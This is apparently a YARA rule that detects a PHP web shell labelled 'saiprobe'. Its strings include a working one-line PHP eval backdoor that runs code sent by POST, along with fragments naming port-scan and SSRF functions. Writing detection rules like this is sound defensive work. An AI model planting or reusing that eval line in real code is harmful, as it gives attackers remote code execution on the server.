rule Backdoor_Webshell_PHP_000517
{
    meta:
        description = "saiprobe"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2017-11-29"
        
    strings:
        $a = "class portScan"
        $b = "<? $order=$_POST['order'];echo eval($order.\";\");?>"
        $c = "document.getElementById(\"inner\").style.display=''"
        $d = "function ssrf($ip,$port=80)"
        
    condition:
        all of them
}